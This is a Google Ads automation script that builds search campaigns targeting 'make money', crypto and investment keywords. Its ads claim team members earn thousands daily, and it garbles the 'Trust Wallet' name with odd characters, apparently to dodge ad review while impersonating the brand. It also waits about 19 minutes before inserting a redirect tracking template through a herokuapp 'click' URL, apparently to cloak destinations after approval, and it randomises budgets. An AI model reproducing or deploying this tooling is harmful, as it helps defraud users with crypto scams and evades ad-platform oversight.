function main() {
    //
    //
    //removeLabels()
    var _bgt = 9; // $
    var adjustText = true;
    //
    const inputParameters = {
        url__: "",
        keys: "", // make_money, tips, coin, invest, cheat
        texts: "", // make_money, coin, invest
        trackingUrl__: "",
        countriesStr: "", //
        samaraId: "", //
        schedule: "",
        appendCamp: 0,
    };

    // delay, duration, range
    //
    var time = { delay: 8.5 + Math.round(Math.random() * 0), duration: 3.5, range: 12 };

    //
    // new zealand
    var targetedCountries = getAllTargetCountries(inputParameters.countriesStr);
    if (!targetedCountries.ok || !inputParameters.url__ || !inputParameters.trackingUrl__) {
        Logger.log(
            "ERROR. CHECK INPUT PARAMETERS: const inputParameters = {  url__: '', trackingUrl__: '', countriesStr: '' };"
        );
        return;
    }

    //
    //
    Logger.log(targetedCountries.array);
    const budgetMultiplier = getBudgetMultiplier();
    var _bgtLevel = (_bgt * 100 + Math.random() * 2000) * budgetMultiplier;
    var opts = getOpts(inputParameters, targetedCountries, _bgtLevel, adjustText, budgetMultiplier, time);
    _updateAd(opts);

    //showAllPlacementExclusions(opts.cOpts.name);
}

// *******************************************************************************************
// *******************************************************************************************
function _updateAd(opts) {
    const constants = {
        CAMPAIGN_CREATED: "CAMPAIGN_CREATED",
        AD_GROUP_CREATED: "AD_GROUP_CREATED",
        AD_CREATED: "AD_CREATED",
        LOCATIONS_CREATED: "LOCATIONS_CREATED",
        CUSTOM_PARAMETER_ADDED: "CUSTOM_PARAMETER_ADDED",
        TRAKING_TEMPLATE_ADDED: "TRAKING_TEMPLATE_ADDED",
        DEVICE_MODIFIER_APPLIED: "DEVICE_MODIFIER_APPLIED",
    };
    var labels = getLabels();
    _createSearchCampaigns(opts, labels, constants);
    Utilities.sleep(2000);
    _addGroup(opts.cOpts.name, opts.gOpts, labels, constants);
    Utilities.sleep(2000);
    _addExpandedTextAd(opts.cOpts.name, opts.gOpts.name, opts.aOpts, labels, constants);
    setSchedule(opts.cOpts.name, opts.schedule);
    addExtentions(opts, constants, labels);
    _decreaseModifier(labels, constants);
    insertSuffix(opts.utm_content);
    addNegativeKeywordToCampaign(opts.cOpts.name);
    if (opts.tracking.enabled) {
        Utilities.sleep(290000);
        Utilities.sleep(290000);
        Utilities.sleep(290000);
        Utilities.sleep(290000);

        insertTemplate(opts, labels, constants);
    }
    getStatReport();
    return;
}

// *******************************************************************************************
// *******************************************************************************************
function setSchedule(campaignName, schedule) {
    // Logger.log(schedule);
    if (schedule == "off") {
        return;
    }
    if (!schedule.ok) {
        return;
    }
    var days = ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"];
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var camp = campaignIterator.next();
        for (var i = 0; i < days.length; i++) {
            for (var j = 0; j < schedule.result.length; j++) {
                var json = schedule.result[j];
                json.dayOfWeek = days[i];
                json.bidModifier = 1;
                camp.addAdSchedule(json);
            }
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function addExtentions(opts) {
    var ext = opts.extensions;
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    if (!campaignIterator.hasNext()) return;
    var siteLinks = []; //ext.siteLinks;
    for (var i = 0; i < ext.siteLinks.length; i++) {
        var builder = AdsApp.extensions()
            .newSitelinkBuilder()
            .withLinkText(ext.siteLinks[i].text)
            .withDescription1(ext.siteLinks[i].desc1)
            .withDescription2(ext.siteLinks[i].desc2)
            .withFinalUrl(opts.aOpts.url + ext.siteLinks[i].anchor)
            //.withMobilePreferred(true)
            .build();
        if (builder.isSuccessful()) {
            siteLinks.push(builder.getResult());
        } else {
            Logger.log(bulder.getErrors());
        }
    }

    var newSnippet1 = AdsApp.extensions()
        .newSnippetBuilder()
        .withHeader("Types")
        .withValues(ext.snippets)
        //.withMobilePreferred(false)
        .build()
        .getResult();
    var callouts = [];
    for (var i = 0; i < ext.callouts.length; i++) {
        var builder = AdsApp.extensions().newCalloutBuilder().withText(ext.callouts[i]).build();
        if (builder.isSuccessful()) {
            callouts.push(builder.getResult());
        } else {
            Logger.log(bulder.getErrors());
        }
    }
    // var newCallout1 = AdsApp.extensions().newCalloutBuilder().withText("Sign Up").build().getResult();

    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        for (var i = 0; i < siteLinks.length; i++) {
            campaign.addSitelink(siteLinks[i]);
        }

        campaign.addSnippet(newSnippet1);

        for (var i = 0; i < callouts.length; i++) {
            campaign.addCallout(callouts[i]);
        }
    }
}

// *******************************************************************************************
// *******************************************************************************************
function _improveModifier(labels, constants) {
    return;
}
// *******************************************************************************************
// *******************************************************************************************
function _decreaseModifier(labels, constants) {
    return;
}
// *******************************************************************************************
// *******************************************************************************************
function getStatReport() {}
// *******************************************************************************************
// *******************************************************************************************
function _addLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.addLocation(loc, 1);
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function _remLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.excludeLocation(loc, 1);
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function _createSearchCampaigns(opts, labels, constants) {
    const cOpts = opts.cOpts;
    try {
        var campaignIterator = AdsApp.campaigns()
            .withCondition('Name = "' + cOpts.name + '"')
            .get();
        if (!campaignIterator.hasNext()) {
            var columns = [
                "Action",
                "Campaign",
                "Budget",
                /*"Networks",*/ "Language",
                "Bid Strategy type",
                // "Campaign type",
                "Campaign Status",
                "Campaign type",
            ];

            var upload = AdWordsApp.bulkUploads().newCsvUpload(columns, {
                moneyInMicros: false,
            });

            upload.append({
                Action: "add",
                Campaign: cOpts.name || "Search-1.",
                Budget: cOpts.budget,
                "Budget type": "Daily",
                //Networks: cOpts.network,
                Language: cOpts.lang,
                "Campaign type": cOpts.type,
                "Ad rotation": "Optimize for clicks",
                "Bid Strategy type": cOpts.strategy,
                "Campaign Status": cOpts.status,
                // "Campaign type": "Search Only",
            });
            // Use upload.apply() to make changes without previewing.
            if (cOpts.appendCamp) {
                for (var i = 0; i < cOpts.appendCamp; i++) {
                    upload.append({
                        Action: "add",
                        Campaign: cOpts.name + " #" + (i + 2),
                        Budget: cOpts.budget,
                        "Budget type": "Daily",
                        //Networks: cOpts.network,
                        Language: cOpts.lang,
                        "Campaign type": cOpts.type,
                        "Ad rotation": "Optimize for clicks",
                        "Bid Strategy type": cOpts.strategy,
                        "Campaign Status": cOpts.status,
                        // "Campaign type": "Search Only",
                    });
                }
            }
            upload.apply();

            Utilities.sleep(10000);
        }
        _addLocations(opts.cOpts.name, opts.lOpt.inc);
        Utilities.sleep(2000);
        _remLocations(opts.cOpts.name, opts.lOpt.exc);
        return { ok: true };
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************
function _addGroup(campaignName, gOpts, labels, constants) {
    //Logger.log(campaignName);
    //Logger.log(gOpts);
    if (labels[constants.AD_GROUP_CREATED]) {
        return;
    }

    try {
        var groupIterator = AdsApp.adGroups()
            .withCondition('Name = "' + gOpts.name + '"')
            .withCondition('CampaignName = "' + campaignName + '"')
            .get();
        if (groupIterator.hasNext()) {
            return;
        }
        var campaignIterator = AdsApp.campaigns()
            .withCondition('Name = "' + campaignName + '"')
            .get();
        if (campaignIterator.hasNext()) {
            var campaign = campaignIterator.next();
            var adGroupOperation = campaign.newAdGroupBuilder().withName(gOpts.name).withCpc(gOpts.cpc).build();
            var adGroup = adGroupOperation.getResult();
            if (gOpts.keywords) {
                if (gOpts.keywords.length) {
                    for (var i = 0; i < gOpts.keywords.length; i++) {
                        var kw = gOpts.keywords[i];
                        var keywordOperation = adGroup.newKeywordBuilder().withText(kw.word).withCpc(kw.cpc).build();
                        var keyword = keywordOperation.getResult();
                    }
                }
            }

            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.AD_GROUP_CREATED, desc, "blue");
            return { adGroup: adGroup, campaign: campaign, ok: true };
        }
    } catch (error) {
        Logger.log(error);
    }

    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************
function _addExpandedTextAd(campaignName, adGroupName, aOpts, labels, constants) {
    if (labels[constants.AD_CREATED]) {
        return;
    }

    try {
        var adIterator = AdsApp.ads()
            .withCondition('CampaignName = "' + campaignName + '"')
            .get();
        if (adIterator.hasNext()) {
            return;
        }
        var adGroupIterator = AdsApp.adGroups()
            .withCondition('Name = "' + adGroupName + '"')
            .withCondition('CampaignName = "' + campaignName + '"')
            .get();

        if (adGroupIterator.hasNext()) {
            var adGroup = adGroupIterator.next();
            var h1 = shuffleArray(aOpts.h1);
            var h2 = shuffleArray(aOpts.h2);
            var h3 = shuffleArray(aOpts.h3);
            var d1 = shuffleArray(aOpts.d1);
            var d2 = shuffleArray(aOpts.d2);
            if (aOpts.adjust) {
                d1 = adjustDescription(d1);
                while (d1.length > 90) {
                    d1 = adjustDescription(d1);
                }
                d2 = adjustDescription(d2);
                while (d2.length > 90) {
                    d2 = adjustDescription(d2);
                }
                h1 = adjustDescription(h1);
                while (h1.length > 30) {
                    h1 = adjustDescription(h1);
                }
                h2 = adjustDescription(h2);
                while (h2.length > 30) {
                    h2 = adjustDescription(h2);
                }
                h3 = adjustDescription(h1);
                while (h3.length > 30) {
                    h3 = adjustDescription(h1);
                }
            }
            var adOperation = adGroup
                .newAd()
                .expandedTextAdBuilder()
                .withHeadlinePart1(h1)
                .withHeadlinePart2(shuffleArray(aOpts.h2))
                .withHeadlinePart3(shuffleArray(aOpts.h3))
                .withDescription1(shuffleArray(aOpts.d1))
                .withDescription2(shuffleArray(aOpts.d2))
                .withFinalUrl(aOpts.url)
                .build();

            var ad = adOperation.getResult();
            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.AD_CREATED, desc, "blue");
            return {
                ok: true,
                adGroup: adGroup,
                ad: ad,
            };
        }
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************

function shuffleArray(array) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    return array[0];
}
// *******************************************************************************************
// *******************************************************************************************

function shuffleArray2(array, limit) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    if (array.length > limit) {
        // Logger.log("array.legth: " + array.length + " limit: " + limit)
        array = array.slice(0, limit);
        // Logger.log(array.length)
    }
    return array;
}
// *******************************************************************************************
// *******************************************************************************************

function getLabels() {
    const labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        // Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}
// *******************************************************************************************
// *******************************************************************************************
function insertSuffix(utm_content) {
    var campaignsIterator = AdsApp.campaigns().get();
    while (campaignsIterator.hasNext()) {
        var campaign = campaignsIterator.next();
        campaign.urls().setFinalUrlSuffix("utm_term={keyword}&utm_content=" + utm_content);
    }
}
// *******************************************************************************************
// *******************************************************************************************
function insertTemplate(opts, labels, constants) {
    if (!opts.tracking.enabled) return;

    const options = {
        customParameter_uurl: opts.tracking.uurl, // insert your redirect here
        trackingTemplate: opts.tracking.template,
    };

    var campaignsIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    var groupsIterator = AdsApp.adGroups()
        .withCondition('CampaignName = "' + opts.cOpts.name + '"')
        .get();

    var templateInsert = true;

    if (templateInsert) {
        while (campaignsIterator.hasNext()) {
            var object = campaignsIterator.next();
            object.urls().setTrackingTemplate(options.trackingTemplate);
        }
        // _improveModifier(labels, constants);
    }
    while (groupsIterator.hasNext()) {
        var object = groupsIterator.next();
        object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
    }
}
// *******************************************************************************************
// *******************************************************************************************
function getKeyword_10(bid, keysCat) {
    var kws = getKW(keysCat);
    kws = shuffleArray2(kws, 4);
    // var key__ = kws[Math.floor(Math.random() * kws.length)];
    var retKws = [];
    for (var i = 0; i < kws.length; i++) {
        var key__ = kws[i];
        retKws.push({ word: key__, cpc: bid });
        retKws.push({ word: '"' + key__ + '"', cpc: bid });
        retKws.push({ word: "[" + key__ + "]", cpc: bid });
    }
    return retKws;
}
// *******************************************************************************************
// *******************************************************************************************
function getKeyword_All(bid) {
    var kws = getKW();
    // var key__ = kws[Math.floor(Math.random() * kws.length)];
    var retKws = [];
    for (var i = 0; i < kws.length; i++) {
        var key__ = kws[i];
        retKws.push({ word: key__, cpc: bid });
        retKws.push({ word: '"' + key__ + '"', cpc: bid });
        retKws.push({ word: "[" + key__ + "]", cpc: bid });
    }
    return retKws;
}
// *******************************************************************************************
// *******************************************************************************************
function addNegativeKeywordToCampaign(campaignName) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        var nKeys = getNegativeKW();

        for (var i = 0; i < nKeys.length; i++) {
            campaign.createNegativeKeyword("[" + nKeys[i] + "]");
            // campaign.createNegativeKeyword('"' + nKeys[i] + '"'); // ?? ?????????? ???? ?????? ???????????????????
        }
    }
}

// *******************************************************************************************
// *******************************************************************************************
function getNegativeKW() {
    return [
        "teen",
        "survey",
        "ebay",
        "paypal",
        "tiktok",
        "app",
        "instagram",
        "free",
        "teenager",
        "amazon",
        "youtube",
        "music",
        "kid",
        "student",
        "property",
        "child",
        "gta",
        "fans",
        "robux",
        "roblox",
        "prizerebel",
        "torrent",
        "torrents",
        "without",
        "ads",
        "app",
        "bad comments",
        "bad reviews",
        "chat",
        "click",
        "clicks",
        "coins",
        "comments",
        "download",
        "driver",
        "fake",
        "fast",
        "free",
        "games",
        "gta",
        "gta5",
        "instagram",
        "jeffrey epstein",
        "kid",
        "kids",
        "lunches",
        "old",
        "olds",
        "packing",
        "paypal",
        "photos",
        "picks",
        "pics",
        "pocket",
        "quick",
        "reviews",
        "saving",
        "surveys",
        "teen",
        "teenager",
        "teens",
        "tik tok",
        "tiktok",
        "typing",
        "under",
        "video",
        "videos",
        "virtual",
        "watch",
        "webcam",
        "youtube",
    ];
} // *******************************************************************************************
// *******************************************************************************************
function getKW(keysCat) {
    // keys: "", // make_money, tips, coin, invest, cheat

    var keysCategory = {
        make_money: [
            "best way to earn",
            "earn extra money",
            "earn online",
            "how can i make money",
            "how to earn extra",
            "how to make money",
            "how to make money online",
            "make money online",
            "passive income",
            "ways to make money online",
        ],
        coin: ["best coin to buy", "coin to invest"],
        tips: [
            "finance tips",
            "financial planning tips",
            "financial tips",
            "financial advice",
            "financial planning advice",
            "investment advice",
            "business ideas",
            "investment tips",
        ],
        cheat: ["????????? ???????????????", "????????? ??????????????????"],
        invest: [
            "stock market investing",
            "stocks to invest in",
            "ways to invest",
            "ways to invest money",
            "what is the best way to invest",
            "what to invest in",
            "where can i invest my money",
            "where to invest",
            "where to invest money",
            "how to start investing",
            "how to start investing in stocks",
            "how to start investing money",
            "invest in shares",
            "investing for beginners",
            "investing money",
            "investment opportunity",
            "investment planning",
            "how to invest",
            "how to invest and make money",
            "how to invest in share market",
            "how to invest money",
            "how to invest money in share market",
            "how to invest money in stocks",
            "how to invest your money",
            "best investments",
            "best place to invest money",
            "best stock to invest in",
            "best way to invest",
            "best way to invest money",
            "best way to start investing",
            "best ways to invest",
            "good investments",
            "how to begin investing",
        ],
    };
    return keysCategory[keysCat];
}
// *******************************************************************************************
// *******************************************************************************************
function getKeyword(keysCat) {
    const kws = getKW(keysCat);
    return kws[Math.floor(Math.random() * kws.length)];
}
// *******************************************************************************************
// *******************************************************************************************

function getAllTargetCountries(countriesStr) {
    var _tragetedCountriesListTemp = countriesStr.split(";");
    var _tragetedCountriesList = [];
    for (var i = 0; i < _tragetedCountriesListTemp.length; i++) {
        _tragetedCountriesListTemp[i] = _tragetedCountriesListTemp[i].trim().toLowerCase();
        if (_tragetedCountriesListTemp[i]) {
            _tragetedCountriesList.push(_tragetedCountriesListTemp[i]);
        }
    }

    var countriesList = {
        canada: 2124,
        belgium: 2056,
        australia: 2036,
        "united kingdom": 2826,
        switzerland: 2756,
        sweden: 2752,
        spain: 2724,
        norway: 2578,
        "new zealand": 2554,
        netherlands: 2528,
        austria: 2040,
        cyprus: 2196,
        czechia: 2203,
        germany: 2276,
        greece: 2300,
        hungary: 2348,
        italy: 2380,
        poland: 2616,
        portugal: 2620,
        romania: 2642,
        slovakia: 2703,
        spain: 2724,
        "canary islands": 20277,
        russia: 2643,
        "united states": 2840,
        ukraine: 2804,
        belarus: 2112,
        india: 2356,
        kazakhstan: 2398,
        ukraine: 2804,
        denmark: 2208,
        finland: 2246,
        france: 2250,
        ireland: 2372,
        luxembourg: 2442,
    };
    var retObj = { ok: false };
    var array = [];
    var clKeys = Object.keys(countriesList);
    // Logger.log(_tragetedCountriesList, clKeys);
    for (var i = 0; i < clKeys.length; i++) {
        // Logger.log(_tragetedCountriesList.includes(clKeys[i]), clKeys[i], countriesList[clKeys[i]]);
        if (_tragetedCountriesList.includes(clKeys[i])) {
            array.push(countriesList[clKeys[i]]);
        }
    }
    if (array) {
        retObj.ok = true;
        retObj.array = array;
        retObj.list = _tragetedCountriesList;
        retObj.str = countriesStr;
    }
    return retObj;
}
// *******************************************************************************************
// *******************************************************************************************

function adjustDescription(description) {
    var array = [
        "Trust Wallet",
        "Trust Wallet",
        "Trust Wallet",
        "Tru??st Wa??ll????et",
        "Trust Wall????????et",
        "Tr??ust ??Wa??llet??",
        "Tr??ust W??all????et",
        "Trust?? ??????Wallet",
        "T??r??ust ??W??allet",
        "Tr??u??s??t?? Wallet",
        "Tru??st?? W????allet",
    ];
    // var array = ["??ust Wa??le??", "Tr??st Wal??et", "??rust Wa??le??", "??r??st Wal??et", "????ust Wa????e??", "??r??st Wallet"];
    return description.replace("Trust Wallet", shuffleArray(array));
}
// *******************************************************************************************
// *******************************************************************************************
function setupReport(opts) {
    var report = {
        account: AdsApp.currentAccount().getCustomerId(),
        type: opts.type,
        geo: opts.geo,
        url: opts.aOpts.url,
        samaraId: opts.samaraId,
    };
    if (opts.gOpts.keywords.length) {
        report.keyword = opts.gOpts.keywords[0].word;
    }
    var resp1 = UrlFetchApp.fetch(
        "https://script.google.com/macros/s/AKfycbxKa5JWljVilYqg28lEMp4vMakiAsKrZ06Bg8d42Ir2qvTv-TokPypG_xw9zrS-6UCMew/exec",
        {
            method: "POST",
            payload: JSON.stringify(report),
            headers: {
                "Content-Type": "application/json",
            },
        }
    );
}
// *******************************************************************************************
// *******************************************************************************************
function getCallouts() {
    return [
        "24/7 Support Available",
        "Contact Us",
        "Member Benefits",
        // "In Stock",
        "View Reviews",
        "Payment Options Available",
        "A Glossary of Terms",
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function getSnippets() {
    return [
        // "???Register Online",
        "View Member Benefits",
        "View Services",
        "About Us",
        "Contacts",
        "Request Information",
        "Help Center",
        "Blog Center",
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function getSiteLinks() {
    return [
        { text: "Online", desc1: "Methods that work only", desc2: "Use desktop or mobile", anchor: "#online" },
        { text: "Books", desc1: "We have collected", desc2: "All in one place", anchor: "#books" },
        { text: "Secure", desc1: "Safe & Secure Get Information", desc2: "Information online", anchor: "#secure" },
        { text: "Fast", desc1: "Fast & Safe Web Access", desc2: "Get Information", anchor: "#fast" },
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function removeLabels() {
    var lblIter = AdsApp.labels().get();
    while (lblIter.hasNext()) {
        var lbl = lblIter.next();
        lbl.remove();
    }
}
// *******************************************************************************************
// *******************************************************************************************
function getBudgetMultiplier() {
    var currency = AdsApp.currentAccount().getCurrencyCode();
    var url =
        "https://script.google.com/macros/s/AKfycbxI-Jb6TVA7JAiyky-n_nBJx90tu8B0KybFS79nqY95MBV7uKXgS5r1rR0Of4PDelMN/exec?currency=" +
        currency;
    var resp = UrlFetchApp.fetch(url);
    // Logger.log(resp.getContentText());
    var resultJson = JSON.parse(resp.getContentText());
    if (resultJson.ok && resultJson.result) {
        return resultJson.result;
    }
    return 1;
}
// *******************************************************************************************
// *******************************************************************************************
function getSchedule(sessionId, delay, duration, range) {
    try {
        var tz = AdsApp.currentAccount().getTimeZone();
        var url =
            "https://script.google.com/macros/s/AKfycbymQSRYS2wiSFt_ZIJuDms9A-fgo0dAEKfNYQ8FBAy0khXP3MnKtUHQb7woTDvzM9Un/exec?tz=" +
            tz +
            "&sessionId=" +
            sessionId +
            "&delay=" +
            delay +
            "&duration=" +
            duration +
            "&range=" +
            range;
        Logger.log(url);
        var schedule = UrlFetchApp.fetch(url);
        //Logger.log(schedule);
        return JSON.parse(schedule.getContentText());
    } catch (e) {
        return { ok: false };
    }
}
// *******************************************************************************************
// *******************************************************************************************
function getOpts(inputParameters, targetedCountries, _bgtLevel, adjust, budgetMultiplier, time) {
    var bgt = Math.random() * 200 + _bgtLevel; // ???????????? | ???????????????? 9.9, ?????????????? 2.9
    bgt = Math.round(bgt);
    bgt = bgt / 100;
    // var key__ = getKeyword();
    var bid = Math.round(50 * budgetMultiplier) / 100;
    if (budgetMultiplier > 10) {
        bgt = Math.round(bgt);
        bid = Math.round(bid);
    }
    var opts = {
        cOpts: {
            name: "Search-1", // <- ?????????? ???????????????? ????????????????, ???????? ???????????????????? ???????????? ?????? ???????????????????? (???? ?????????? ??????????????) ?? ???????????????????? ????????????????
            budget: bgt,
            lang: "", //it;es;pt <- ?????????????????? ???????????? ?? ?????????? ??????????????
            type: "Search",
            strategy: "Manual CPC", //    "Manual CPC", "CPC (enhanced)",  "Target CPA", "Maximize clicks", "Maximize conversions"
            // network: "Search", //  ???????? ?????????? ??????, ???? null ?????? ??????????????
            status: "Enabled", // "Paused" or "Enabled"
            appendCamp: inputParameters.appendCamp,
        },
        gOpts: {
            name: "AdGroup-1",
            cpc: bid,
            keywords: getKeyword_10(bid, inputParameters.keys),
        },
        aOpts: getAOpts(inputParameters.texts, inputParameters.url__, adjust),
        lOpt: {
            // ?????????????? ???? ?????????????????? ?? ???????????????????? ?????????????? ???? ???????????? ????????
            inc: targetedCountries.array,
            exc: [2356],
        },
        proximities: [],
        tracking: {
            enabled: true,
            template:
                "https://mohen-tohen.herokuapp.com/click?mine={_uurl}&url={lpurl}&parallelTrackingEnabled=false&x=2",
            uurl: inputParameters.trackingUrl__,
        },
        type: "panck-crypto",
        geo: inputParameters.countriesStr,
        samaraId: inputParameters.samaraId,
        extensions: {
            callouts: shuffleArray2(getCallouts(), 20),
            snippets: shuffleArray2(getSnippets(), 10),
            siteLinks: shuffleArray2(getSiteLinks(), 4),
        },
        schedule: "off",
        utm_content: inputParameters.keys + "___" + inputParameters.texts,
        // targetedCountries: targetedCountries,
    };
    if (inputParameters.trackingUrl__ == "off") {
        opts.tracking.enabled = false;
    }

    if (inputParameters.schedule != "off") {
        opts.schedule = getSchedule(inputParameters.samaraId, time.delay, time.duration, time.range);
    }

    return opts;
}
// *******************************************************************************************
// *******************************************************************************************

function getAOpts(textsCat, url__, adjust) {
    // texts: "", // make_money, coin, invest

    var textsCategory = {
        make_money: {
            h1: ["Online Daily Passive Income"],
            h2: ["Turn 250 To a Passive Income"],
            h3: ["Earn more than 2k everyday"],
            d1: ["Each member from our team earn more than 2,582 AUD everyday."],
            d2: ["Come learn and and Start Earning. Welcome the future. "],
            url: url__,
            adjust: adjust,
        },
        coin: {
            h1: ["Looking What Coin to Buy?"],
            h2: ["Best Coins in 2021"],
            h3: ["Top Investment Ideas"],
            d1: ["Using personalized financial strategies, each member of our team earns"],
            d2: [" an average of 2,370 per day. Contact us now and start make money."],
            url: url__,
            adjust: adjust,
        },
        invest: {
            h1: ["Looking For Financial Advice?"],
            h2: ["Best Investment Tips in 2021"],
            h3: ["Get ideas and strategies"],
            d1: ["We provide personal financial strategies and investment tips to our community."],
            d2: ["The idea is simple: allow the average person the opportunity to earn. Contact us now!"],
            url: url__,
            adjust: adjust,
        },
    };

    return textsCategory[textsCat];
}
